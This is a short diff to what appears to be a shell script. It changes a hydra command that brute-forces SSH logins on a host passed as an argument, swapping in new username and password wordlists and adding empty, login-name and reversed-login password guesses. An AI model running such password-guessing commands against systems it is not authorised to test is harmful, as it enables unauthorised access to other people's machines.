@@ -39,4 +39,4 @@ if [ -z "$1" ]; then
 fi
 echo
 echo
-hydra $1 ssh -s 22 -L usuarios.txt -P claves.txt -f -t 3
+hydra $1 ssh -s 22 -L usuarios0.txt -e nsr -w 20 -P claves0.txt -f -t 3
